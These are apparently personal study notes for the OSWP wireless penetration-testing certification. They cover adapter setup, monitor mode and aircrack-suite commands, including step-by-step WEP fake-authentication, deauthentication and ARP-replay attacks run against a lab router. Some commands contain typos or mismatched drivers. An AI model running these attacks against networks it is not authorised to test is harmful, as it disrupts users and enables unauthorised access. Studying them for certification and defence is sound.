# OSWP notes

## Setting up

### Wireless ALFA AWUS036NH

[https://medium.com/@adam.toscher/configure-your-new-wireless-ac-1fb65c6ada57](https://medium.com/@adam.toscher/configure-your-new-wireless-ac-1fb65c6ada57)

After plugin usb wireless adapter\) ALFA AWUS036NH

```bash
# list usb device check that device is detected 
lsusb
# Bus 002 Device 028: ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter

# install drivers
apt-get install realtek-rtl88xxau-dkms

# Unload current driver
rmmod r8187

# load new driver
modprobe r8187

# verifiy that driver is loaded correctly
iwconfig
```

### Basic iw usage

```bash
# wlan1     IEEE 802.11  ESSID:off/any  
#          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
#          Retry short  long limit:2   RTS thr:off   Fragment thr:off
#          Encryption key:off
#          Power Management:off

# detail informtion of wireless interface
iw list

# list of SSID in range
iw dev wlan1 scan|grep SSID
#wlan1     14 channels in total; available frequencies :
#          Channel 01 : 2.412 GHz
#          Channel 02 : 2.417 GHz
#          Channel 03 : 2.422 GHz
#          Channel 04 : 2.427 GHz
#          Channel 05 : 2.432 GHz


# list of SSID frequency
iwlist wlan1 frequency
#wlan1     14 channels in total; available frequencies :
#          Channel 01 : 2.412 GHz
#          Channel 02 : 2.417 GHz
#          Channel 03 : 2.422 GHz
#          Channel 04 : 2.427 GHz
#          Channel 05 : 2.432 GHz

# list what channel AP points are transmitting on - useful for filtering background noise used later
iw dev wlan1 scan | egrep "DS\ Parameter\ set|SSID"

#Setting wireless in monitor mode
iw dev wlan1 interface add mon0 type monitor
ifconfig mon0 up
iwconfig
# mon0     IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
#          Retry short  long limit:2   RTS thr:off   Fragment thr:off
#          Power Management:off
tcp -i mon0 -s 65000 -p
#delete interface
iw dev mon0 interface del
iwconfig
```

### IEEE wireless device

```bash
#to find out currently loaded wlan
lspci
#0c:00.0 Network controller: Intel Corporation PRO/Wireless 
lspci -vv -s 0c:00.0
#        Kernel driver in use: r8169
#        Kernel modules: r8169

# get a list of ESSID
iwlist wlan0 scanning | egrep "ESSID|Channel"

#monitor on channel 3
iwconfig wlan0 mode monitor channel 3
iwconfig wlan0 mode managed
```

## Airmon-ng

```bash
# check process that may interfere with airmon-ng
airmon-ng check 

# kill all interfering processes
airmon-ng check kill

# monitor mode
airmon-ng start wlan0

airmon-ng stop mon0

# set airmon-ng on listening mode on channel 3
airmon-ng start wlan0 3

iwlist mon0 channel
```

## Airodump-ng

```bash
# start wlan0 in monitor mode first
airmon-ng start wlan0

# start monitoring
airodump-ng mon0
#CH 10 ][ Elapsed: 0 s ][ 2020-11-11 15:40                                                                        
#                                                                                    #                              
# BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                  
#                                                                                                                  
# CC:22:3d:AF:AA:67  -55        1        1    0   9  270   WPA2 CCMP   PSK  Mkpg                                   



#sniffing the traffic
airodump-ng -c <channel> --bssid <bssid>
airodump-ng -c <channel> --essid <SSID name> -w <capture_file_name> mon0
```

## Aireplay-ng

for replay attacks

```bash
# first put wlan0 in monitor mode eg. airmon-ng start wlan0
# injection test 
aireplay-ng -9 mon0

# card to card injection test - tests if we can perform air replay with the card
# aireplay-ng -9 -i <transmitter> <receiving_card>
aireplay-ng -9 -i wlan1 mon0
```

## Cracking WEP

### Fake authentication attack \(MAC association\)

* On router running with WEP encryption and transmit in channel 3
* On Kali

  ```bash
  # start monitor in channel 3
  airmon-ng start wlan0 3

  # save capture file to disk - breaking it later (let it run)
  aiodump-ng -c 3 --essid <SSID NAME> -w wepfile1 mon0

  # perform fake authentication attack - on new terminal
  ## Authenticate my mac address to accesspoint (else traffic will be rejected)
  # -1 fake auth attack
  # 0 association timing in seconds
  aireplay-ng -1 0 -e <essid> -a <mac_addr> -h <own-mac> mon0


  # view the packets (total 4 of them in the fake authentication of mac to accesspoint)
  wireshark wepfile1
  ```

  In a possible attack scenario, where an AP has MAC address filtering. We need to first obtain a valid mac address of a client, then wait until the client is no longer on the network and impersonate the client by performing fake authentication attack to associate our attacking machine with the victim access point.

### De-authentication attack

Forcing the client to disconnect

* On Attacker start monitor mode and write to file 

```bash
aiodump-ng -c 3 --essid <SSID NAME> -w wepfile1 mon0
```

* connect to victim via vncviewer \(win xp\)
* On client machine \(Client winxp has 1 wired interface, 1 wireless interface\). Ping wireless router indefinitely
* On Kali

```bash
#-0 deauth attack
#1 number of deauth attack packet to send 
aireplay-ng -0 1 -a <AP-mac-addr> -c <Victim-mac-addr> mon0

# On Client machine, observe that continuous ping is broken suddenly (the client has de-authenticated and tries to re-connect. In this process, the process is being monitored by our )

# view the packets (total 4 of them in the fake authentication of mac to accesspoint)
wireshark wepfile1
```

By capturing these arp packets, an attacker is able to use this to generate a large number of weak IV - subsequently able to crack the password

### Arp replay request attack

Listens for an arp request packet, and retransmit it back to the AP. So that AP repeats with new IV - collecting so many that we can finally crack it with aircrack-ng.

* On Attacker start monitor mode and write to file

```bash
aiodump-ng -c 3 --essid <SSID NAME> -w wepfile1 mon0

#(bug that need to run this before we perform the arp reply request attack)
aireplay-ng -1 0 -e <essid> -a <mac_addr> -h <own-mac> mon0

# and let it wait how many IV it is captured
aireplay-ng -3 -b <AP-mac-addr> -h <our-mac> mon0


# if this is taking too long to captured more packets
#On new terminal send a deauth attack packet
aireplay-ng -0 1 -a <AP-mac-addr> -c <client-mac-addr> mon0
```

## Aircrack-ng

